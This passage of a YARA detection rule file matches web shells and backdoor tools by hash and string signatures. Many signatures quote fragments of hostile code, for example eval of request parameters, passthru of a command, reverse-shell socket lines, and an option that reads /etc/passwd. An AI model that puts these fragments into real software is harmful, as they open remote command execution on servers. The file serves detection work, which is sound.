$s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:"
$s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm"
condition:
1 of them
}
rule SSC_webshell_C99madShell_v_3_0_smowu {
meta:
description = "Web Shell - file smowu.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "74e1e7c7a6798f1663efb42882b85bee"
strings:
$s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for"
$s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty"
condition:
1 of them
}
rule SSC_webshell_2008_2009lite_2009mssql {
meta:
description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
hash1 = "3f4d454d27ecc0013e783ed921eeecde"
hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
strings:
$s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');"
$s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all"
condition:
all of them
}
rule SSC_webshell_bypass_iisuser_p {
meta:
description = "Web shells - generated from file bypass-iisuser-p.asp"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "924d294400a64fa888a79316fb3ccd90"
strings:
$s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject"
condition:
all of them
}
rule SSC_webshell_php_s_u {
meta:
description = "Web Shell - file s-u.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "efc7ba1a4023bcf40f5e912f1dd85b5a"
strings:
$s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea"
condition:
all of them
}
rule SSC_WebShell_zehir4_asp_php {
meta:
description = "PHP Webshells Github Archive - file zehir4.asp.php.txt"
author = "Florian Roth"
hash = "1d9b78b5b14b821139541cc0deb4cbbd994ce157"
strings:
$s4 = "response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&"
$s11 = "frames.byZehir.document.execCommand("
$s15 = "frames.byZehir.document.execCommand(co"
condition:
2 of them
}
rule SSC_hxdef100 {
meta:
description = "Webshells Auto-generated - file hxdef100.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "55cc1769cef44910bd91b7b73dee1f6c"
strings:
$s0 = "RtlAnsiStringToUnicodeString"
$s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
$s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"
condition:
all of them
}
rule SSC_FeliksPack3___PHP_Shells_phpft {
meta:
description = "Webshells Auto-generated - file phpft.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "60ef80175fcc6a879ca57c54226646b1"
strings:
$s6 = "PHP Files Thief"
$s11 = "http://www.4ngel.net"
condition:
all of them
}
rule SSC_hkshell_hkrmv {
meta:
description = "Webshells Auto-generated - file hkrmv.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "bd3a0b7a6b5536f8d96f50956560e9bf"
strings:
$s5 = "/THUMBPOSITION7"
$s6 = "\\EvilBlade\\"
condition:
all of them
}
rule SSC_WebShell_mysql_tool {
meta:
description = "PHP Webshells Github Archive - file mysql_tool.php"
author = "Florian Roth"
hash = "c9cf8cafcd4e65d1b57fdee5eef98f0f2de74474"
strings:
$s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
$s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword
condition:
2 of them
}
rule SSC_webshell_asp_up {
meta:
description = "Web Shell - file up.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "f775e721cfe85019fe41c34f47c0d67c"
strings:
$s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio"
$s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword
condition:
1 of them
}
rule SSC_bdcli100 {
meta:
description = "Webshells Auto-generated - file bdcli100.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b12163ac53789fb4f62e4f17a8c2e028"
strings:
$s5 = "unable to connect to "
$s8 = "backdoor is corrupted on "
condition:
all of them
}
rule SSC_multiple_webshells_0012 {
meta:
description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_r577_php_php_SnIpEr_SA_Shell_php_r57_php_php_spy_php_php_s_php_php"
hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
hash1 = "911195a9b7c010f61b66439d9048f400"
hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
hash4 = "817671e1bdc85e04cc3440bbd9288800"
strings:
$s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
$s1 = ".$arrow.\"</b>\",in('text','"
condition:
2 of them
}
rule SSC_multiple_webshells_0008 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt, ctt_sh.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php_ctt_sh_php_php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "3ca5886cd54d495dc95793579611f59a"
hash2 = "9c5bb5e3a46ec28039e8986324e42792"
hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
hash5 = "09609851caa129e40b0d56e90dfc476c"
hash6 = "671cad517edd254352fe7e0c7c981c39"
strings:
$s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\""
$s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile"
$s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr"
$s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m"
condition:
all of them
}
rule SSC_php_reverse_shell : webshell {
meta:
description = "Laudanum Injector Tools - file php-reverse-shell.php"
author = "Florian Roth"
reference = "http://laudanum.inguardians.com/"
date = "2015-06-22"
hash = "3ef03bbe3649535a03315dcfc1a1208a09cea49d"
strings:
$s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii /* PEStudio Blacklist: strings */
$s2 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii /* PEStudio Blacklist: strings */
$s3 = "$input = fread($pipes[1], $chunk_size);" fullword ascii /* PEStudio Blacklist: strings */
condition:
filesize < 15KB and all of them
}
rule SSC_webshell_he1p_JspSpy_nogfw_ok_style_1_JspSpy1 {
meta:
description = "Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "b330a6c2d49124ef0729539761d6ef0b"
hash1 = "d71716df5042880ef84427acee8b121e"
hash2 = "344f9073576a066142b2023629539ebd"
hash3 = "32dea47d9c13f9000c4c807561341bee"
hash4 = "b9744f6876919c46a29ea05b1d95b1c3"
hash5 = "3ea688e3439a1f56b16694667938316d"
hash6 = "2434a7a07cb47ce25b41d30bc291cacc"
strings:
$s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
$s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?"
$s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
$s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>"
condition:
2 of them
}
rule SSC_WebShell_php_webshells_pws {
meta:
description = "PHP Webshells Github Archive - file pws.php"
author = "Florian Roth"
hash = "7a405f1c179a84ff8ac09a42177a2bcd8a1a481b"
strings:
$s6 = "if ($_POST['cmd']){" fullword
$s7 = "$cmd = $_POST['cmd'];" fullword
$s10 = "echo \"FILE UPLOADED TO $dez\";" fullword
$s11 = "if (file_exists($uploaded)) {" fullword
$s12 = "copy($uploaded, $dez);" fullword
$s17 = "passthru($cmd);" fullword
condition:
4 of them
}
rule SSC_Worse_Linux_Shell_php {
meta:
description = "Semi-Auto-generated  - file Worse Linux Shell.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "8338c8d9eab10bd38a7116eb534b5fa2"
strings:
$s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
$s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"
condition:
1 of them
}
rule SSC_KA_uShell {
meta:
description = "Webshells Auto-generated - file KA_uShell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "685f5d4f7f6751eaefc2695071569aab"
strings:
$s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass"
$s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}"
condition:
all of them
}
rule SSC_WebShell_Gamma_Web_Shell {
meta:
description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
author = "Florian Roth"
hash = "7ef773df7a2f221468cc8f7683e1ace6b1e8139a"
strings:
$s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
$s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
$s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
$s20 = "my $command = $self->query('command');" fullword
condition:
2 of them
}
rule SSC_webshell_webshells_new_PHP1 {
meta:
description = "Web shells - generated from file PHP1.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "14c7281fdaf2ae004ca5fec8753ce3cb"
strings:
$s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
$s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
$s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword
condition:
1 of them
}
rule SSC_WebShell_dC3_Security_Crew_Shell_PRiV_2 {
meta:
description = "PHP Webshells Github Archive - file dC3 Security Crew Shell PRiV.php"
author = "Florian Roth"
hash = "9077eb05f4ce19c31c93c2421430dd3068a37f17"
strings:
$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
$s9 = "header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));" fullword
$s13 = "header(\"Content-type: image/gif\");" fullword
$s14 = "@copy($file,$to) or die (\"[-]Error copying file!\");" fullword
$s20 = "if (isset($_GET['rename_all'])) {" fullword
condition:
3 of them
}
rule SSC_WebShell_Sincap_1_0 {
meta:
description = "PHP Webshells Github Archive - file Sincap 1.0.php"
author = "Florian Roth"
hash = "9b72635ff1410fa40c4e15513ae3a496d54f971c"
strings:
$s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
$s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
$s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
$s12 = "while (($ekinci=readdir ($sedat))){" fullword
$s19 = "$deger2= \"$ich[$tampon4]\";" fullword
condition:
2 of them
}
rule SSC_webshell_jsp_sys3 {
meta:
description = "Web Shell - file sys3.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "b3028a854d07674f4d8a9cf2fb6137ec"
strings:
$s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
$s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword
condition:
all of them
}
rule SSC_multiple_webshells_0028 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, dC3 Security Crew Shell PRiV.php.txt, SpecialShell_99.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_dC3_Security_Crew_Shell_PRiV_php_SpecialShell_99_php_php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "3ca5886cd54d495dc95793579611f59a"
hash2 = "9c5bb5e3a46ec28039e8986324e42792"
hash3 = "433706fdc539238803fd47c4394b5109"
hash4 = "09609851caa129e40b0d56e90dfc476c"
strings:
$s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":"
$s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";" fullword
condition:
all of them
}
rule SSC_webshell_PHP_Shell_x3 {
meta:
description = "Web Shell - file PHP Shell.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
strings:
$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
$s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
$s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset("
condition:
2 of them
}
rule SSC_webshell_jsp_reverse_jsp_reverse_jspbd {
meta:
description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
author = "Florian Roth"
date = "2014/01/28"
super_rule = 1
hash0 = "8b0e6779f25a17f0ffb3df14122ba594"
hash1 = "ea87f0c1f0535610becadf5a98aca2fc"
hash2 = "7d5e9732766cf5b8edca9b7ae2b6028f"
score = 50
strings:
$s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
$s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
$s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword
condition:
all of them
}
rule SSC_webshell_Inderxer {
meta:
description = "Web Shell - file Inderxer.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "9ea82afb8c7070817d4cdf686abe0300"
strings:
$s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
condition:
all of them
}
rule SSC_webshell_webshells_new_Asp {
meta:
description = "Web shells - generated from file Asp.asp"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "32c87744ea404d0ea0debd55915010b7"
strings:
$s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword
$s2 = "Function MorfiCoder(Code)" fullword
$s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword
condition:
1 of them
}
rule SSC_webshell_Crystal_Crystal {
meta:
description = "Web Shell - file Crystal.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "fdbf54d5bf3264eb1c4bff1fac548879"
strings:
$s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value"
$s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f"
condition:
all of them
}
rule SSC_Webshell_acid_FaTaLisTiCz_Fx_fx_p0isoN_sh3ll_x0rg_byp4ss_256 {
meta:
description = "Detects Webshell - rule generated from from files acid.php, FaTaLisTiCz_Fx.txt, fx.txt, p0isoN.sh3ll.txt, x0rg.byp4ss.txt"
author = "Florian Roth"
reference = "https://github.com/nikicat/web-malware-collection"
date = "2016-01-11"
score = 70
hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
hash2 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
hash3 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
hash4 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
hash5 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"
strings:
$s0 = "<form method=\"POST\"><input type=hidden name=act value=\"ls\">" fullword ascii
$s2 = "foreach($quicklaunch2 as $item) {" fullword ascii
condition:
filesize < 882KB and all of them
}
rule SSC_HYTop_CaseSwitch_2005 {
meta:
description = "Webshells Auto-generated - file 2005.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "8bf667ee9e21366bc0bd3491cb614f41"
strings:
$s1 = "MSComDlg.CommonDialog"
$s2 = "CommonDialog1"
$s3 = "__vbaExceptHandler"
$s4 = "EVENT_SINK_Release"
$s5 = "EVENT_SINK_AddRef"
$s6 = "By Marcos"
$s7 = "EVENT_SINK_QueryInterface"
$s8 = "MethCallEngine"
condition:
all of them
}
rule SSC_uploader {
meta:
description = "Webshells Auto-generated - file uploader.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b9a9aab319964351b46bd5fc9d6246a8"
strings:
$s0 = "move_uploaded_file($userfile, \"entrika.php\"); "
condition:
all of them
}
rule SSC_webshell_jsp_cmd {
meta:
description = "Web Shell - file cmd.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "5391c4a8af1ede757ba9d28865e75853"
strings:
$s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword
condition:
all of them
}
rule SSC_webshell_browser_201_3_ma_ma2_download {
meta:
description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "37603e44ee6dc1c359feb68a0d566f76"
hash1 = "a7e25b8ac605753ed0c438db93f6c498"
hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
hash4 = "4b45715fa3fa5473640e17f49ef5513d"
hash5 = "fa87bbd7201021c1aefee6fcc5b8e25a"
strings:
$s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
$s2 = "private static String tempdir = \".\";" fullword
$s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\""
condition:
2 of them
}
rule SSC_WebShell_php_webshells_lostDC {
meta:
description = "PHP Webshells Github Archive - file lostDC.php"
author = "Florian Roth"
hash = "d54fe07ea53a8929620c50e3a3f8fb69fdeb1cde"
strings:
$s0 = "$info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';" fullword
$s4 = "header ( \"Content-Description: Download manager\" );" fullword
$s5 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" second"
$s9 = "if (mkdir($_POST['dir'], 0777) == false) {" fullword
$s12 = "$ret = shellexec($command);" fullword
condition:
2 of them
}
rule SSC_asp_shell : webshell {
meta:
description = "Laudanum Injector Tools - file shell.asp"
author = "Florian Roth"
reference = "http://laudanum.inguardians.com/"
date = "2015-06-22"
hash = "8bf1ff6f8edd45e3102be5f8a1fe030752f45613"
strings:
$s1 = "<form action=\"shell.asp\" method=\"POST\" name=\"shell\">" fullword ascii /* PEStudio Blacklist: strings */
$s2 = "%ComSpec% /c dir" fullword ascii /* PEStudio Blacklist: strings */
$s3 = "Set objCmd = wShell.Exec(cmd)" fullword ascii /* PEStudio Blacklist: strings */
$s4 = "Server.ScriptTimeout = 180" fullword ascii /* PEStudio Blacklist: strings */
$s5 = "cmd = Request.Form(\"cmd\")" fullword ascii /* PEStudio Blacklist: strings */
$s6 = "' ***  http://laudanum.secureideas.net" fullword ascii
$s7 = "Dim wshell, intReturn, strPResult" fullword ascii /* PEStudio Blacklist: strings */
condition:
filesize < 15KB and 4 of them
}
rule SSC_webshell_asp_01 {
meta:
description = "Web Shell - file 01.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 50
hash = "61a687b0bea0ef97224c7bd2df118b87"
strings:
$s0 = "<%eval request(\"pass\")%>" fullword
condition:
all of them
}
rule SSC_eBayId_index3 {
meta:
description = "Webshells Auto-generated - file index3.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "0412b1e37f41ea0d002e4ed11608905f"
strings:
$s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"
condition:
all of them
}
rule SSC_webshell_jspShell {
meta:
description = "Web Shell - file jspShell.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "0d5b5a17552254be6c1c8f1eb3a5fdc1"
strings:
$s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on"
$s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;"
condition:
all of them
}
rule SSC_webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx {
meta:
description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, t00ls.jsp, u.jsp, xia.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
hash1 = "059058a27a7b0059e2c2f007ad4675ef"
hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
hash4 = "8b457934da3821ba58b06a113e0d53d9"
hash5 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
hash6 = "14e9688c86b454ed48171a9d4f48ace8"
hash7 = "b330a6c2d49124ef0729539761d6ef0b"
hash8 = "d71716df5042880ef84427acee8b121e"
hash9 = "341298482cf90febebb8616426080d1d"
hash10 = "29aebe333d6332f0ebc2258def94d57e"
hash11 = "42654af68e5d4ea217e6ece5389eb302"
hash12 = "88fc87e7c58249a398efd5ceae636073"
hash13 = "4a812678308475c64132a9b56254edbc"
hash14 = "9626eef1a8b9b8d773a3b2af09306a10"
hash15 = "344f9073576a066142b2023629539ebd"
hash16 = "32dea47d9c13f9000c4c807561341bee"
hash17 = "90a5ba0c94199269ba33a58bc6a4ad99"
hash18 = "655722eaa6c646437c8ae93daac46ae0"
hash19 = "b9744f6876919c46a29ea05b1d95b1c3"
hash20 = "9c94637f76e68487fa33f7b0030dd932"
hash21 = "6acc82544be056580c3a1caaa4999956"
hash22 = "6aa32a6392840e161a018f3907a86968"
hash23 = "349ec229e3f8eda0f9eb918c74a8bf4c"
hash24 = "3ea688e3439a1f56b16694667938316d"
hash25 = "ab77e4d1006259d7cbc15884416ca88c"
hash26 = "71097537a91fac6b01f46f66ee2d7749"
hash27 = "2434a7a07cb47ce25b41d30bc291cacc"
hash28 = "7a4b090619ecce6f7bd838fe5c58554b"
strings:
$s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype="
$s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T"
condition:
all of them
}
rule SSC_phpjackal_php {
meta:
description = "Semi-Auto-generated  - file phpjackal.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "ab230817bcc99acb9bdc0ec6d264d76f"
strings:
$s3 = "$dl=$_REQUEST['downloaD'];"
$s4 = "else shelL(\"perl.exe $name $port\");"
condition:
1 of them
}
rule SSC_webshell_shell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_arabicspy_PHPSPY_hkrkoz {
meta:
description = "Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "791708057d8b429d91357d38edf43cc0"
hash1 = "b68bfafc6059fd26732fa07fb6f7f640"
hash2 = "42f211cec8032eb0881e87ebdb3d7224"
hash3 = "40a1f840111996ff7200d18968e42cfe"
hash4 = "e0202adff532b28ef1ba206cf95962f2"
hash5 = "0712e3dc262b4e1f98ed25760b206836"
hash6 = "802f5cae46d394b297482fd0c27cb2fc"
strings:
$s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
$s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d"
condition:
all of them
}
rule SSC_WebShell_Moroccan_Spamers_Ma_EditioN_By_GhOsT {
meta:
description = "PHP Webshells Github Archive - file Moroccan Spamers Ma-EditioN By GhOsT.php"
author = "Florian Roth"
hash = "31e5473920a2cc445d246bc5820037d8fe383201"
strings:
$s4 = "$content = chunk_split(base64_encode($content)); " fullword
$s12 = "print \"Sending mail to $to....... \"; " fullword
$s16 = "if (!$from && !$subject && !$message && !$emaillist){ " fullword
condition:
all of them
}
rule SSC_WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_2 {
meta:
description = "PHP Webshells Github Archive - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
author = "Florian Roth"
hash = "8fdd4e0e87c044177e9e1c97084eb5b18e2f1c25"
strings:
$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
$s3 = "xb5@hotmail.com</FONT></CENTER></B>\");" fullword
$s4 = "$v = @ini_get(\"open_basedir\");" fullword
$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
condition:
2 of them
}
rule SSC_WebShell_Generic_PHP_8 {
meta:
description = "PHP Webshells Github Archive - from files Macker's Private PHPShell.php, PHP Shell.php, Safe0ver Shell -Safe Mod Bypass By Evilc0der.php"
author = "Florian Roth"
super_rule = 1
hash0 = "fc1ae242b926d70e32cdb08bbe92628bc5bd7f99"
hash1 = "9ad55629c4576e5a31dd845012d13a08f1c1f14e"
hash2 = "c4aa2cf665c784553740c3702c3bfcb5d7af65a3"
strings:
$s1 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword
$s2 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
$s3 = "/* I added this to ensure the script will run correctly..." fullword
$s14 = "<!--    </form>   -->" fullword
$s15 = "<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">" fullword
$s20 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword
condition:
3 of them
}
rule SSC_Webshell_acid_AntiSecShell_3 {
meta:
description = "Detects Webshell Acid"
author = "Florian Roth"
reference = "https://github.com/nikicat/web-malware-collection"
date = "2016-01-11"
score = 70
hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
hash4 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
hash5 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
hash6 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
hash7 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
hash8 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
hash9 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
hash10 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
hash11 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
hash12 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
hash13 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
hash14 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
hash15 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
hash16 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
hash17 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
hash18 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"
strings:
$s0 = "echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";" fullword ascii
$s1 = "if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}" fullword ascii
condition:
filesize < 900KB and all of them
}
rule SSC_webshell_webshells_new_make2 {
meta:
description = "Web shells - generated from file make2.php"
author = "Florian Roth"
date = "2014/03/28"
hash = "9af195491101e0816a263c106e4c145e"
score = 50
strings:
$s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8"
condition:
all of them
}
rule SSC_webshell_jsp_jshell {
meta:
description = "Web Shell - file jshell.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "124b22f38aaaf064cef14711b2602c06"
strings:
$s0 = "kXpeW[\"" fullword
$s4 = "[7b:g0W@W<" fullword
$s5 = "b:gHr,g<" fullword
$s8 = "RhV0W@W<" fullword
$s9 = "S_MR(u7b" fullword
condition:
all of them
}
